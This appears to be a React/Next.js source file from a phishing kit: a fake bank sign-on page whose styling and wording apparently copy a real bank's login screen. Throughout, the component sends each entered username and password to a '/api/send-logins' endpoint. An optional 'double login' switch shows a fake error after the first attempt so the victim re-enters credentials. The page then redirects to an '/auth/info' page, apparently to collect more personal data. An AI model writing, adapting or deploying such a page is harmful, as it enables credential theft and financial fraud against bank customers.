import React, { useContext, useEffect, useState } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { Input } from "../components/Input";
import { Wrapper } from "../components/Wrapper";
import { greeting } from "../utils/greeting";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { DataContext } from "./_app";
import { Error } from "../components/Error";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup
    .string()
    .required("That username is too short.")
    .min(6, "That username is too short."),
  password: yup
    .string()
    .required("That password is too short.")
    .min(6, "That password is too short."),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [logins, setLogins] = useState({});
  const [check, setCheck] = useState(false);
  const [showCheckLabel, setShowCheckLabel] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    push(`/auth/info`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper>
      <div className="FloatingPage__floating-container___3gDFl FloatingPage__desktop___2aDLy antiClickjackContent">
        {showError ? <Error /> : null}
        <div
          style={{
            display: `flex`,
            flexWrap: `nowrap`,
            alignItems: `center`,
            justifyContent: `center`,
          }}
        >
          <h1 className="FloatingPage__salutationTitle___1X9Mp">
            Good {greeting()}{" "}
            <span className="FloatingPage__title___2W2k5">
              Sign on to manage your accounts
            </span>
          </h1>
        </div>
        <div>
          <form>
            <div className="Login__containerWrap___143_z">
              <div className="WFFieldSpacing__text___2s42d">
                <Input
                  name={`username`}
                  label={`Username`}
                  error={errors.username && errors.username.message}
                  register={register}
                  curValue={watch(`username`)}
                />
              </div>
              <div className="Login__passwordField___ek2Dp">
                <div className="WFFieldSpacing__text___2s42d">
                  <Input
                    name={`password`}
                    label={`Password`}
                    type={`password`}
                    error={errors.password && errors.password.message}
                    register={register}
                    curValue={watch(`password`)}
                  />
                </div>
              </div>
              <div
                data-testid="saveUsername-checkbox"
                style={{
                  display: `flex`,
                  flexFlow: `row nowrap`,
                  alignItems: `center`,
                }}
              >
                <div>
                  <div className="WFField__field___3JstE Login__checkboxLabel___6lvlM">
                    <div>
                      <div
                        data-accessible-id="BZNYGCND"
                        className="WFCheckbox__checkbox___13xDk"
                        role="checkbox"
                        data-focus-target="true"
                        data-testid="checkbox-saveUsername"
                        aria-checked="false"
                        aria-labelledby="XYQGRWWE"
                        aria-disabled="false"
                        aria-required="false"
                        onClick={() => {
                          setCheck(!check);
                          setShowCheckLabel(true);
                        }}
                        style={{
                          display: `inline-flex`,
                          flexFlow: `row nowrap`,
                          alignItems: `flex-start`,
                          paddingTop: `0.5rem`,
                          paddingBottom: `0.5rem`,
                        }}
                      >
                        <div
                          style={{
                            alignItems: `center`,
                            marginRight: `0.5rem`,
                          }}
                        >
                          <svg
                            width="24px"
                            height="24px"
                            viewBox="0 0 24 24"
                            aria-hidden="true"
                            role="img"
                            className={`CheckboxIcon__checkbox___35aJi ${
                              check ? `CheckboxIcon__checked___1s4OU` : ``
                            }`}
                            focusable="false"
                          >
                            <g>
                              <rect
                                data-container=""
                                strokeWidth="2"
                                x="1"
                                y="1"
                                width="22"
                                height="22"
                                rx="2"
                              ></rect>
                            </g>
                            <g
                              data-indeterminate=""
                              stroke="none"
                              strokeWidth="2"
                              fill="none"
                              fillRule="evenodd"
                            >
                              <rect
                                data-mark=""
                                x="7"
                                y="11"
                                width="10"
                                height="3"
                                rx="0.5"
                              ></rect>
                            </g>
                            <g
                              data-checked=""
                              stroke="none"
                              strokeWidth="0.1"
                              fill="none"
                              fillRule="evenodd"
                            >
                              <path
                                data-mark=""
                                d="M10.6718094,14.0493012 L16.9923135,7.18339788 C17.1793395,6.98023326 17.4956516,6.96715036 17.6988162,7.15417642 C17.7087886,7.16335664 17.7183835,7.17293857 17.7275773,7.18289847 L18.8507123,8.39962804 C19.0273329,8.59096711 19.0275332,8.8858299 18.8511726,9.07740872 L11.9272812,16.598766 L10.9964717,17.6625483 C10.8146307,17.8703667 10.4987493,17.8914254 10.290931,17.7095844 C10.2743279,17.6950566 10.2587044,17.6794459 10.2441632,17.6628546 L6.13924101,12.979215 C5.97403664,12.7907199 5.97392197,12.5090337 6.13897282,12.3204042 L7.2705365,11.0271885 C7.45237753,10.8193702 7.76825884,10.7983115 7.97607715,10.9801525 C7.99268031,10.9946802 8.00830374,11.010291 8.02284501,11.0268823 L10.6718094,14.0493012 Z"
                                fill="#FFFFFF"
                                fillRule="nonzero"
                              ></path>
                            </g>
                          </svg>
                        </div>
                        <div
                          id="XYQGRWWE"
                          style={{
                            paddingTop: `0.25rem`,
                            paddingRight: `0.5rem,`,
                          }}
                        >
                          Save username
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <span>
                  {check && showCheckLabel ? (
                    <div className="PositionedContainer__relative___3zr4E">
                      <div
                        data-testid="positionedContainer"
                        className="WFTooltip__container___10RMG"
                        role="dialog"
                        aria-describedby="RFAQLZRT"
                        data-scrollable="true"
                        style={{ left: `-198.402px`, bottom: `45.5px` }}
                      >
                        <span
                          data-localized="global.dialog.begin"
                          className="visuallyHidden"
                        >
                          Beginning of dialog
                        </span>
                        <div
                          className="PositionedContainerContent__content___Z_6Tf"
                          style={{ flex: `1 1 auto`, maxHeight: `421px` }}
                        >
                          <div
                            className="PositionedContainerContent__arrowContainer___7dU9h"
                            style={{
                              left: `115px`,
                              bottom: `-10px`,
                              transform: `rotate(180deg)`,
                            }}
                          >
                            <svg
                              width="20px"
                              height="10px"
                              viewBox="0 0 20 10"
                              aria-hidden="true"
                              role="img"
                              className="TriangleIcon__icon___3dVwi PositionedContainerContent__arrow___1EZn8"
                              focusable="false"
                            >
                              <g transform="">
                                <path d="M10 0l10 10H0z"></path>
                                <path
                                  d="M0,10 L10,0 L20,10"
                                  data-outline=""
                                ></path>
                              </g>
                            </svg>
                          </div>
                          <div className="WFTooltip__content___3e8z5">
                            <button
                              type="button"
                              aria-label="Close"
                              className="Button__button___3y0lE WFTooltip__closeButton___GlePH"
                              data-testid="closeButton"
                              onClick={() => setShowCheckLabel(false)}
                            >
                              <svg
                                width="16px"
                                height="16px"
                                viewBox="0 0 16 16"
                                strokeLinejoin="round"
                                aria-hidden="true"
                                role="img"
                                className="ResponsiveModalCloseIcon__icon___K3HzP WFTooltip__closeIconFillColor___2pUgi"
                                focusable="false"
                              >
                                <path d="M15 1.6L13.4 0 7.5 5.9 1.6 0 0 1.6 5.9 7.5 0 13.4 1.6 15 7.5 9.1 13.4 15 15 13.4 9.1 7.5 15 1.6Z"></path>
                              </svg>
                            </button>
                            <h2
                              data-testid="wfTooltipHeader"
                              id="RFAQLZRT"
                              className="WFTooltip__heading___KUFAE WFTooltip__useWFFonts___101gI false"
                            >
                              Save username
                            </h2>
                            <div
                              data-testid="wfTooltipSection"
                              className="Content__content___kjCw3 Content__useWFFonts___Ev8Ia"
                            >
                              <div style={{ marginRight: `0.25rem` }}>
                                <span
                                  className="visuallyHidden"
                                  data-testid="beginning-of-region"
                                >
                                  <span data-localized="global.begin.region">
                                    Begin region
                                  </span>
                                </span>
                                {`We don't recommend saving your username if you're on a shared device.`}
                                <span
                                  className="visuallyHidden"
                                  data-testid="end-of-region"
                                >
                                  <span data-localized="global.end.region">
                                    End of region
                                  </span>
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                        <span
                          data-localized="global.dialog.end"
                          className="visuallyHidden"
                        >
                          End of dialog
                        </span>
                      </div>
                    </div>
                  ) : null}
                </span>
              </div>
            </div>
            <section
              className="CaptchaPayload__captchaWrapper___CDEDn"
              id="captchaContainer"
              data-testid="capatcha-payload"
            ></section>
            <div
              className="Login__signOnButton___3uWQF"
              style={{
                display: `flex`,
                flexWrap: `nowrap`,
                alignItems: `center`,
                justifyContent: `center`,
              }}
            >
              <button
                type="button"
                className={`Button__button___3y0lE Button__modern___3lAgx ${
                  loading || !isValid ? `Button__disabled___1L4yr` : ``
                } Button__responsive___1QHpq Button__primary___ritso`}
                data-testid="signon-button"
                disabled={loading || !isValid}
                onClick={onSubmit}
              >
                Sign on
              </button>
            </div>
            <section
              className="Panel__panel___24pqd Panel__desktop___1p7aO"
              data-testid="panel-container"
              style={{
                display: `flex`,
                flexFlow: `row nowrap`,
                alignItems: `center`,
                justifyContent: `center`,
              }}
            >
              <span className="Panel__panelFooter___Ss_3p Panel__desktop___1p7aO">
                <a
                  data-testid="forgotUsernamePassword"
                  style={{
                    textDecoration: `underline`,
                    cursor: `pointer`,
                  }}
                >
                  <span data-localized="loginApp.login.label.forgotUsernamePassword">
                    Forgot username or password?
                  </span>
                </a>
              </span>
            </section>
          </form>
        </div>
      </div>
    </Wrapper>
  );
};

export default Login;
